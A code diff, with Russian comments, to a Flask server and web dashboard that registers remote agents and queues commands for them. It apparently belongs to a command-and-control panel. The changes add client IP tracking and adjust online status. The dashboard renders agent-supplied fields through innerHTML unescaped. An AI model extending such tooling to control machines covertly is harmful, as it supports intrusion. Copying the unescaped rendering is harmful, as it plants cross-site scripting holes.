@@ -13,7 +13,7 @@ clients = {}       # client_id -> {hostname, username, os, cwd, last_seen}
 task_queue = {}     # client_id -> {id, command, args}
 results = {}        # task_id -> {result, timestamp}
 
-TIMEOUT = 30  # секунд до того, как клиент будет считаться оффлайн
+TIMEOUT = 10  # секунд до того, как клиент будет считаться оффлайн
 
 # ============================================================
 # Client API (Взаимодействие с Агентом)
@@ -33,6 +33,7 @@ def api_register():
             "os": data.get("os", "?"),
             "cwd": data.get("cwd", "?"),
             "last_seen": time.time(),
+            "ip": request.headers.get('X-Forwarded-For', request.remote_addr),
         }
         print(f"[*] New client registered: {cid} ({clients[cid]['hostname']})")
         return jsonify({"status": "ok"})
@@ -44,6 +45,7 @@ def api_register():
 def api_get_task(client_id):
     if client_id in clients:
         clients[client_id]["last_seen"] = time.time()
+        clients[client_id]["ip"] = request.headers.get('X-Forwarded-For', request.remote_addr)
     
     # Извлекаем задачу для клиента
     task = task_queue.pop(client_id, None)
@@ -96,6 +98,7 @@ def api_clients():
             "cwd": info["cwd"],
             "last_seen": info["last_seen"],
             "online": (now - info["last_seen"]) < TIMEOUT,
+            "ip": info.get("ip", "?.?.?.?"),
         })
     return jsonify({"clients": client_list})
 
@@ -294,11 +297,11 @@ async function fetchClients() {
     return;
   }
   sb.innerHTML = data.clients.map(c => {
-    const online = (Date.now()/1000 - c.last_seen) < 15;
+    const online = c.online;
     const cls = (selectedClient === c.id) ? "client-card active" : "client-card";
     return `<div class="${cls}" onclick="selectClient('${c.id}')">
       <div class="hostname"><span class="status-dot ${online?'online':'offline'}"></span>${c.hostname}</div>
-      <div class="meta">${c.username} &middot; ${c.os} &middot; ${c.id}</div>
+      <div class="meta">${c.username} &middot; ${c.os} &middot; ${c.ip} &middot; ${c.id}</div>
     </div>`;
   }).join("");
 }
